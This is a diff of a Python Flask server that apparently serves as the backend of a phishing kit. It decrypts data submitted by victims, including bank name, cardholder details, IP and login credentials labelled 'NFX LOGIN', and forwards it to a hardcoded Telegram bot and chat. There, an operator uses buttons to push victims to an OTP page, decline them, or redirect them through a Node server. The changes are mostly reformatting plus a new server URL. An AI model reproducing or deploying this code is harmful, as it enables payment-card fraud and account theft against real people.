@@ -22,24 +22,30 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 
 # Get environment variables
-ENCRYPTION_KEY = bytes.fromhex(os.getenv('ENCRYPTION_KEY', '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'))
+ENCRYPTION_KEY = bytes.fromhex(
+    os.getenv(
+        'ENCRYPTION_KEY',
+        '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'))
 IV = bytes.fromhex(os.getenv('IV', '0123456789abcdef0123456789abcdef'))
-TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8')
+TELEGRAM_BOT_TOKEN = os.getenv(
+    'TELEGRAM_BOT_TOKEN', '7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '1096335592')
-NODE_SERVER_URL = os.getenv('NODE_SERVER_URL', 'https://d60e5406-587e-45fe-8826-c38f5e292056-0-membership.fly.dev')
+NODE_SERVER_URL = os.getenv('NODE_SERVER_URL',
+                            'https://bd938k-membership.onrender.com')
+
 
 def decrypt_data(encrypted_data):
     try:
-        cipher = Cipher(
-            algorithms.AES(ENCRYPTION_KEY),
-            modes.CBC(IV),
-            backend=default_backend()
-        )
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY),
+                        modes.CBC(IV),
+                        backend=default_backend())
         decryptor = cipher.decryptor()
-        padded_data = decryptor.update(bytes.fromhex(encrypted_data)) + decryptor.finalize()
+        padded_data = decryptor.update(
+            bytes.fromhex(encrypted_data)) + decryptor.finalize()
 
         # Remove padding more carefully
-        unpadded_data = padded_data.decode('utf-8').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f')
+        unpadded_data = padded_data.decode('utf-8').rstrip(
+            '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f')
 
         logger.debug(f"Decrypted data before JSON parse: {unpadded_data}")
         return json.loads(unpadded_data)
@@ -47,16 +53,18 @@ def decrypt_data(encrypted_data):
         logger.error(f"Decryption error: {str(e)}")
         raise
 
+
 def send_node_request(session_id, response_data, allow_redirects=True):
     """Send request to Node.js server with proper handling of redirects"""
     try:
-        response = requests.post(
-            f'{NODE_SERVER_URL}/session-update',
-            json={'sessionId': session_id, 'response': response_data},
-            headers={'Content-Type': 'application/json'},
-            allow_redirects=allow_redirects,
-            timeout=30
-        )
+        response = requests.post(f'{NODE_SERVER_URL}/session-update',
+                                 json={
+                                     'sessionId': session_id,
+                                     'response': response_data
+                                 },
+                                 headers={'Content-Type': 'application/json'},
+                                 allow_redirects=allow_redirects,
+                                 timeout=30)
 
         # Handle redirect
         if response.status_code == 302:
@@ -67,10 +75,12 @@ def send_node_request(session_id, response_data, allow_redirects=True):
                 # Follow redirect manually
                 response = requests.post(
                     redirect_url,
-                    json={'sessionId': session_id, 'response': response_data},
+                    json={
+                        'sessionId': session_id,
+                        'response': response_data
+                    },
                     headers={'Content-Type': 'application/json'},
-                    timeout=30
-                )
+                    timeout=30)
 
         return response.status_code in [200, 201, 302]
 
@@ -78,15 +88,12 @@ def send_node_request(session_id, response_data, allow_redirects=True):
         logger.error(f"Request to Node.js failed: {str(e)}")
         return False
 
+
 def send_telegram_message(chat_id, text, keyboard=None):
     try:
         url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
 
-        payload = {
-            'chat_id': chat_id,
-            'text': text,
-            'parse_mode': 'HTML'
-        }
+        payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
 
         if keyboard:
             payload['reply_markup'] = json.dumps(keyboard)
@@ -99,9 +106,11 @@ def send_telegram_message(chat_id, text, keyboard=None):
         logger.error(f"Telegram error: {str(e)}")
         raise
 
+
 @app.route('/')
 def home():
     return "Server is running"
+
 
 @app.route('/receive-encrypted-data', methods=['POST'])
 def receive_encrypted_data():
@@ -138,12 +147,29 @@ BANK: {decrypted_data['bankName'].upper()}
 IP: {decrypted_data['ip']}
 Session ID: {decrypted_data['sessionId']}"""
                 inline_keyboard = {
-                    'inline_keyboard': [
-                        [{'text': '✅ Approve with Custom URL', 'callback_data': f"redirect_{decrypted_data['sessionId']}"}],
-                        [{'text': '▶️ Continue to OTP', 'callback_data': f"approve_{decrypted_data['sessionId']}"}],
-                        [{'text': '❌ Decline Payment', 'callback_data': f"decline_{decrypted_data['sessionId']}"}],
-                        [{'text': '🔁 Redirect to PPL', 'callback_data': f"redirect_ppl_{decrypted_data['sessionId']}"}]
-                    ]
+                    'inline_keyboard':
+                    [[{
+                        'text':
+                        '✅ Approve with Custom URL',
+                        'callback_data':
+                        f"redirect_{decrypted_data['sessionId']}"
+                    }],
+                     [{
+                         'text': '▶️ Continue to OTP',
+                         'callback_data':
+                         f"approve_{decrypted_data['sessionId']}"
+                     }],
+                     [{
+                         'text': '❌ Decline Payment',
+                         'callback_data':
+                         f"decline_{decrypted_data['sessionId']}"
+                     }],
+                     [{
+                         'text':
+                         '🔁 Redirect to PPL',
+                         'callback_data':
+                         f"redirect_ppl_{decrypted_data['sessionId']}"
+                     }]]
                 }
             else:
                 message = f"""
@@ -158,12 +184,29 @@ BANK: {decrypted_data['bankName'].upper()}
 IP: {decrypted_data['ip']}
 Session ID: {decrypted_data['sessionId']}"""
                 inline_keyboard = {
-                    'inline_keyboard': [
-                        [{'text': '✅ Approve with Custom URL', 'callback_data': f"redirect_{decrypted_data['sessionId']}"}],
-                        [{'text': '▶️ Continue to OTP', 'callback_data': f"approve_{decrypted_data['sessionId']}"}],
-                        [{'text': '❌ Decline Payment', 'callback_data': f"decline_{decrypted_data['sessionId']}"}],
-                        [{'text': '🔁 Redirect to PPL', 'callback_data': f"redirect_ppl_{decrypted_data['sessionId']}"}]
-                    ]
+                    'inline_keyboard':
+                    [[{
+                        'text':
+                        '✅ Approve with Custom URL',
+                        'callback_data':
+                        f"redirect_{decrypted_data['sessionId']}"
+                    }],
+                     [{
+                         'text': '▶️ Continue to OTP',
+                         'callback_data':
+                         f"approve_{decrypted_data['sessionId']}"
+                     }],
+                     [{
+                         'text': '❌ Decline Payment',
+                         'callback_data':
+                         f"decline_{decrypted_data['sessionId']}"
+                     }],
+                     [{
+                         'text':
+                         '🔁 Redirect to PPL',
+                         'callback_data':
+                         f"redirect_ppl_{decrypted_data['sessionId']}"
+                     }]]
                 }
         elif message_type == 'login':
             message = f"""- NFX LOGIN -
@@ -181,7 +224,8 @@ IP      : {decrypted_data['ip']}
             inline_keyboard = None
 
         # Send to Telegram
-        telegram_response = send_telegram_message(TELEGRAM_CHAT_ID, message, inline_keyboard)
+        telegram_response = send_telegram_message(TELEGRAM_CHAT_ID, message,
+                                                  inline_keyboard)
 
         if telegram_response.get('ok'):
             return jsonify({'success': True})
@@ -193,6 +237,7 @@ IP      : {decrypted_data['ip']}
     except Exception as e:
         logger.error(f"Error in receive_encrypted_data: {str(e)}")
         return jsonify({'success': False, 'message': str(e)}), 500
+
 
 @app.route('/telegram-updates', methods=['POST'])
 def telegram_updates():
@@ -221,8 +266,12 @@ def telegram_updates():
 
             # Check completed sessions
             if session_id in completed_sessions:
-                send_telegram_message(chat_id, '❌ This session has already been processed')
-                return jsonify({'success': False, 'message': 'Session already processed'})
+                send_telegram_message(
+                    chat_id, '❌ This session has already been processed')
+                return jsonify({
+                    'success': False,
+                    'message': 'Session already processed'
+                })
 
             # Prepare response based on action
             response_data = None
@@ -234,7 +283,10 @@ def telegram_updates():
                     'message': 'continue_to_otp',
                     'method': 'POST',
                     'redirectUrl': '/otp-verification',
-                    'formData': {'bank': bank_name, 'cchold': full_name}
+                    'formData': {
+                        'bank': bank_name,
+                        'cchold': full_name
+                    }
                 }
                 confirmation_message = f"✅ Continued to OTP verification for {full_name}"
 
@@ -264,7 +316,8 @@ def telegram_updates():
                     if action != 'redirect':
                         completed_sessions.add(session_id)
                     else:
-                        pending_sessions[session_id]['status'] = 'waiting_for_url'
+                        pending_sessions[session_id][
+                            'status'] = 'waiting_for_url'
 
                     # Send confirmation
                     if confirmation_message:
@@ -274,7 +327,8 @@ def telegram_updates():
                 else:
                     raise Exception("Failed to update session")
 
-        elif data.get('message') and data['message'].get('text', '').startswith('http'):
+        elif data.get('message') and data['message'].get(
+                'text', '').startswith('http'):
             message_text = data['message']['text']
             chat_id = data['message']['chat']['id']
 
@@ -287,8 +341,8 @@ def telegram_updates():
 
             if active_session:
                 if send_node_request(active_session, {
-                    'status': 'url_redirect',
-                    'url': message_text
+                        'status': 'url_redirect',
+                        'url': message_text
                 }):
                     completed_sessions.add(active_session)
                     del pending_sessions[active_session]
@@ -296,13 +350,15 @@ def telegram_updates():
                 else:
                     send_telegram_message(chat_id, "❌ Failed to set URL")
             else:
-                send_telegram_message(chat_id, "❌ No active session waiting for URL")
+                send_telegram_message(chat_id,
+                                      "❌ No active session waiting for URL")
 
         return jsonify({'success': True})
 
     except Exception as e:
         logger.error(f"Error in telegram_updates: {str(e)}")
         return jsonify({'success': False, 'message': str(e)}), 500
+
 
 if __name__ == '__main__':
     port = int(os.getenv('PORT', 5000))
